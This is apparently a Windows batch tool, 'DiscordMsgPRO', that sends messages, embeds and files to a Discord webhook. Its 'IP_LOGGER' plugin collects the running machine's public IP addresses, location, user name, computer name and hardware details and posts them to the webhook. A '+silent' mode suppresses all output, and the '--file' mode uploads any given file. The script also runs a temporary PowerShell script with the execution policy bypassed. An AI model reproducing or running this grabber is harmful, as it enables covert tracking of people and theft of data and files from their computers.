@echo off
setlocal EnableDelayedExpansion
pushd %~dp0
chcp 65001 >nul
set "Default=[0m" & set "bgwhite=[107m" & set "bgblack=[40m" & set "bgyellow=[43m" & set "black=[30m" & set "red=[31m" & set "green=[32m" & set "yellow=[33m" & set "blue=[34m" & set "magenta=[35m" & set "cyan=[36m" & set "white=[37m" & set "grey=[90m" & set "brightred=[91m" & set "brightgreen=[92m" & set "brightyellow=[93m" & set "brightblue=[94m" & set "brightmagenta=[95m" & set "brightcyan=[96m" & set "brightwhite=[97m" & set "underline=[4m" & set "underlineoff=[24m"

:: Program Required Variables.
set "APPNAME=DiscordMsgPRO"
set version=2.0

:: Check for updates
for /f %%A in ('curl --silent "https://raw.githubusercontent.com/agamsol/Quick-Message-Sender/main/Premium/Premium_Updates.txt"') do set lastversion=%%A

:: Check Detail
set "Silent=%~1"
set "Mode=%~2"
set "plugin=%~3"
if not defined Silent echo !red!ERROR: !grey!Please contact Staff member in our discord for help!!Default! & exit /b
if /i "%Silent%"=="+silent" set "Silent=True" & goto :CHECKED_IS_SILENT
if /i "%Silent%"=="-silent" set "Silent=False" & goto :CHECKED_IS_SILENT
:IS_COMMAND
if /i "%Silent%"=="--command" set "Silent=False" & set "Mode=Command" & goto :CHECKED_IS_COMMAND
echo !red!ERROR: !grey!Silent/command Mode was not defined!!Default!
exit /b

:CHECKED_IS_SILENT
:IS_MDOE
if /i "%Mode%"=="--update" set "Mode=Update" & goto :CHECKED_IS_UPDATE
if /i "%Mode%"=="--message" set "Mode=Message" & goto :CHECKED_IS_MESSAGE
if /i "%Mode%"=="--embed" set "Mode=Embed" & goto :CHECKED_IS_EMBED
if /i "%Mode%"=="--file" set "Mode=File" & goto :FILE_SEND
if /i "%Mode%"=="--plugin" set "Mode=Plugin" & (
  if /i ["%plugin%"]==["IP_Logger"] goto:CHECKED_IS_PLUGIN_IP_LOGGER
  if /i ["%plugin%"]==["Webhook_Check"] set "Webhook_check_Called_inapp=False" & goto:CHECKED_IS_PLUGIN_WEBHOOK_CHECK
  if "%Silent%"=="False" echo !red!ERROR: !grey!Plugin not Found!!Default!
  exit /b
)
if "%Silent%"=="False" echo !red!ERROR: !grey!Usage Mode was not defined!!Default!
  exit /b

:CHECKED_IS_UPDATE
  if not "%version%"=="%lastversion%" (
  if "%Silent%"=="False" echo. & echo  !yellow!Warn: !grey!New Version ^(!lastversion!^) is Available.!Default!
)
exit /b

:CHECKED_IS_MESSAGE
set "Webhook_check_Called_inapp=True"
call :CHECKED_IS_PLUGIN_WEBHOOK_CHECK
if "%Webhook_Check_Err%"=="True" exit /b
set "Message=%~3"
if not defined Message if "%Silent%"=="False" echo !red!ERROR: !grey!No Message was defined.!Default! & exit /b
set "Message=!Message:\\n=%%0A!"

curl -d "content=%Message%" -X POST %webhook%
if "%Silent%"=="False" echo !green!Sucsess!grey!, Message Sent.!Default!
exit /b
:CHECKED_IS_EMBED
set "EmbedTitle=%~3"
set "EmbedMessage=%~4"
set "EmbedColor=%~5"
set "AttachedImage=%~6"
:CHECKED_IS_EMBED_SET
set "Webhook_check_Called_inapp=True"
call :CHECKED_IS_PLUGIN_WEBHOOK_CHECK
if "%Webhook_Check_Err%"=="True" exit /b
if "%EmbedColor%"=="" ( if "%Silent%"=="False" echo !red!ERROR: !grey!No color was defined.!Default! & exit /b )
if "%EmbedTitle%"=="" ( if "%Silent%"=="False" echo !red!ERROR: !grey!No Title was defined.!Default! & exit /b )
if "%EmbedMessage%"=="" ( if "%Silent%"=="False" echo !red!ERROR: !grey!No Message was defined.!Default! & exit /b )
:Check_color
ver > nul
set EmbedColor=!EmbedColor:#=!
set /a "EmbedColor=0x!EmbedColor!">nul 2>&1
if !errorlevel! neq 0 (
  if "!Silent!"=="False" echo.
  if "!Silent!"=="False" echo !red!ERROR: !grey!The Selected Color is not valid.!Default!
  exit /b
)

:Perpare
:: Add Linebreaks to Message and title
set "EmbedTitle=!EmbedTitle:`n=``n!"
set "EmbedTitle=!EmbedTitle:\\n=`n!"

set "EmbedMessage=!EmbedMessage:`n=``n!"
set "EmbedMessage=%EmbedMessage:\\n=`n%"

:: /Add Linebreaks to Message
(
   echo $webHookUrl = '%webhook%'
   echo [System.Collections.ArrayList]$embedArray = @(^)
   echo $title       = "%EmbedTitle%"
   echo $description = "%EmbedMessage%"
   echo $color       = '%EmbedColor%'
   echo $thumbUrl = '%AttachedImage%'
   echo $thumbnailObject = [PSCustomObject]@{
   echo     url = $thumbUrl
   echo }
   echo $embedObject = ^[PSCustomObject^]@{
   echo     title       = $title
   echo     description = $description
   echo     color       = $color
   echo     thumbnail   = $thumbnailObject
   echo }
   echo $embedArray.Add^($embedObject^) ^| Out-Null
   echo $payload = [PSCustomObject]@{
   echo     embeds = $embedArray
   echo }
   echo Invoke-RestMethod -Uri $webHookUrl -Body ^($payload ^| ConvertTo-Json -Depth 4^) -Method Post -ContentType 'application/json'
 ) >"%Temp%\DiscordMessage.ps1" & chcp 437 > nul & powershell -ExecutionPolicy Bypass "%Temp%\DiscordMessage.ps1" >nul & chcp 65001 >nul
  ping localhost -n 3 >nul
  del /s /q "%Temp%\DiscordMessage.ps1" >nul

if "%Silent%"=="False" echo !green!Sucsess!grey!, Embed Sent.!Default!
exit /b

:CHECKED_IS_COMMAND
if ["%~2"]==[""] echo !red!ERROR: !grey!Command not provided...!Default! & exit /b
if /i ["%~2"]==["help"] goto :HELP
if /i ["%~2"]==["info"] goto :INFO
if /i ["%~2"]==["plugins"] goto :PLUGINS
if "%Silent%"=="False" echo !red!ERROR: !grey!Unknown Command.!Default!
exit /b

:HELP
mode 130,52
echo.
echo    !yellow!♦ Getting Started:
echo.
echo        !brightblue!For Getting started you need to open cmd.exe prompt
echo        !brightblue!After opening the prompt you will need to CD to
echo        !brightblue!the location that the file %APPNAME%.exe
echo        !brightblue!Then you will will be able to type commands and use the Program
echo        !brightblue!Commands Listed Below.
echo.
echo.
echo    !yellow!♦ Webhook Setup:
echo.
echo        !brightblue!To Set up your Webhook you first need to Create the webhook info at !red!https://bit.ly/Webhook
echo        !brightblue!After Creating the webhook, Copy the URL and Type
echo        !bgwhite! !brightblue!Set Webhook=!red!WEBHOOK_URL_HERE !bgblack!
echo.
echo.
echo    !yellow!♦ Command options:
echo.
echo    [Step 1]:
echo.
echo        !white!call "%APPNAME%" !cyan!+silent !grey!^| The Command will not give you any outputs
echo.
echo        !white!call "%APPNAME%" !cyan!-silent !grey!^| The Command will give outputs
echo.
echo        !white!call "%APPNAME%" !red!--command COMMAND_NAME !grey!^| type external commands of %APPNAME%.exe
echo                             Commands: help, info, colors, plugins
echo.
echo.
echo    !yellow![Step 2]:
echo.
echo        !white!call "%APPNAME%" [Argument 1]!cyan! --message "your message \\n for linebreaks" !grey!^| Send Normal Messages With Plain Text
echo.
echo        !white!call "%APPNAME%" [Argument 1]!cyan! --embed "Embed \\nTitle" "Embed message \\n for linebreaks" "HEXCOLOR" "Image URL (Optional)"
echo                                    !grey!Send Embed Discord Messages With Images and make them look better
echo.
echo        !white!call "%APPNAME%" [Argument 1]!cyan! --plugin PLUGIN_NAME !grey!^| Use Plugins to send Advanced messages 
echo                                    Plugins: ( IP_LOGGER "color" "Text below /nThe Details (Optional)" "Title (Optional)" "Image URL (Optional)" )
echo                                             ( WEBHOOK_CHECK "Webhook_URL" )
echo.
echo    !yellow!♦ Update options:
echo.
echo        !white!call "%APPNAME%" [Argument 1]!cyan! --update !grey!^| Check For Updates And install if there are.
echo.
echo.
echo    !red!Press any key to EXIT.!Default!
pause >nul
exit /b

:PLUGINS
cls
mode 170,15
echo.
echo    !yellow!♦ Plugins Usage:
echo.
echo        !brightblue!IP LOGGER: !grey!"!brightmagenta!IP_LOGGER!grey!" !grey!^| Built In Embed to log IPs.
echo        !white!call "%APPNAME%".exe [Argument 1] !brightblue!--plugin !grey!"!brightmagenta!IP_LOGGER!grey!" "!brightred!COLOR!grey!" "!brightred!Text below /nThe Details (Optional)!grey!" "!brightred!Title URL (Optional)!grey!" "!brightred!Image URL (Optional)!grey!"
echo.
echo        !yellow!Press any key to EXIT.!Default!
pause >nul
exit /b

:INFO
cls
echo.
echo     !grey!Program Version: !green!v%version%!grey!
echo     Trial: !green!Open Source 
echo.
echo    !yellow!Press any key to EXIT.!Default!
pause >nul
exit /b

:: (START) IP_LOGGER Plugin
:CHECKED_IS_PLUGIN_IP_LOGGER
  set "EmbedColor=%~4"
  set "IP_LOGGER_MESSAGE=%~5"
  set "EmbedTitle=%~6"
  set "AttachedImage=%~7"
  if not defined AttachedImage set "AttachedImage=https://i.imgur.com/vDGOsZc.png"
  for /f %%B in ('curl --silent "https://api.ipify.org?format=text"') do set IPv4=%%B
  for /f %%B in ('curl --silent "https://api64.ipify.org?format=text"') do set IPv6=%%B
  echo %IPv6%| find "." >nul
  if not errorlevel 1 ( set "IPv6=  :x: No IPv6 address detected." ) else ( echo not found)
  for /f "tokens=*" %%a in ('curl --silent "http://ip-api.com/line?fields=1"') do set Country=%%a
  for /f "tokens=*" %%a in ('curl --silent "http://ip-api.com/line?fields=16"') do set City=%%a
  for /f "skip=2 tokens=2 delims=)" %%A in ('wmic timezone get caption /value') do set Capital=%%A
  for /f "tokens=1* delims==" %%a in ('wmic cpu get name /VALUE') do if /i %%a EQU name set CPU=%%b
  for /f "tokens=1* delims==" %%a in ('wmic path win32_VideoController get name /value') do if /i %%a equ name set GPU=%%b
  chcp 437 > nul & for /f %%B in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "RAM=%%BGB" & chcp 65001 >nul
  set "Capital=!Capital:~1!"
  if not defined EmbedTitle ( set "EmbedTitle=IP Logger | %Username%" )
  set "EmbedMessage=\\n**ROUTER:**\\n**IPv4:** !IPv4!\\n**IPv6:** !IPv6!\\n**Country:** !Country!\\n**City:** !City!\\n**Capital:** !Capital!\\n\\n **PC DETAIL:**\\n**User:** !username!\\n**Computer Name:** !computername!\\n**CPU:** !CPU!\\n**GPU:** !GPU!\\n**RAM:** !RAM!\\n\\n!IP_LOGGER_MESSAGE!"
  goto :CHECKED_IS_EMBED_SET
:: (END) IP_LOGGER Plugin


:: (START) WEBHOOK_CHECK Plugin
:CHECKED_IS_PLUGIN_WEBHOOK_CHECK
  set Invalid_Webhook=
  set Webhook_Check_Err=
  set Arg4=%~4
  if not defined Arg4 if not defined webhook (
    if "%Silent%"=="False" echo !red!ERROR: !grey!Webhook Not Provided.!Default!
    set "Webhook_Check_Err=True"
    exit /b
    )
  if not defined webhook set "Webhook=%~4"
  if "%webhook:~0,33%"=="https://discord.com/api/webhooks/" goto:CHECKED_IS_PLUGIN_WEBHOOK_CHECK_CORRECT_STRUCTURE
  if "%webhook:~0,37%"=="https://ptb.discord.com/api/webhooks/" goto:CHECKED_IS_PLUGIN_WEBHOOK_CHECK_CORRECT_STRUCTURE
  if "%webhook:~0,40%"=="https://canary.discord.com/api/webhooks/" goto:CHECKED_IS_PLUGIN_WEBHOOK_CHECK_CORRECT_STRUCTURE
  if "%Silent%"=="False" echo !red!ERROR: !grey!The Provided Webhook URL is Incorrect.!Default!
  set "Webhook_Check_Err=True"
  exit /b
  :CHECKED_IS_PLUGIN_WEBHOOK_CHECK_CORRECT_STRUCTURE
  FOR /F "tokens=* USEBACKQ" %%F IN (`curl --silent "%webhook%"`) DO ( SET "WebhookCheck=%%F" )
  echo %WebhookCheck% | findstr /ic:"404: Not Found" >nul && set "Invalid_Webhook=True"
  echo %WebhookCheck% | findstr /ic:"401: Unauthorized" >nul && set "Invalid_Webhook=True"
  echo %WebhookCheck% | findstr /ic:"Invalid Webhook Token" >nul && set "Invalid_Webhook=True"
  if "%Invalid_Webhook%"=="True" (
    if "%Silent%"=="False" echo !red!ERROR: !grey!Invalid Webhook URL.!Default!
    set "Webhook_Check_Err=True"
    exit /b
  )
  if not "%Webhook_check_Called_inapp%"=="True" if "%Silent%"=="False" echo !grey!The Webhook Provided is !green!Correct!grey!.!Default!
  exit /b
:: (END) WEBHOOK_CHECK Plugin


:FILE_SEND
set "Webhook_check_Called_inapp=True"
call :CHECKED_IS_PLUGIN_WEBHOOK_CHECK
if "%Webhook_Check_Err%"=="True" exit /b
set "SendFile=%~3"
if not defined SendFile if "%Silent%"=="False" echo !red!ERROR: !grey!File Path not Provided!Default! & exit /b
if not exist "%SendFile%" if "%Silent%"=="False" echo !red!ERROR: !grey!Path Provided os incorrect!Default! & exit /b
if exist "%SendFile%\*" if "%Silent%"=="False" echo !red!ERROR: !grey!Path Provided is not a file!!Default! & exit /b
for /F "delims=" %%F in ("%SendFile%") do if %%~zF geq 8000000 if "%Silent%"=="False" echo !red!ERROR: !grey!Discord's File Size Limit is 8MB, Your file is too heavy!Default! & exit /b
curl --silent -F file="@%SendFile%" "%webhook%" >nul
if "%Silent%"=="False" echo !green!Sucsess!grey!, File Sent.!Default!
exit /b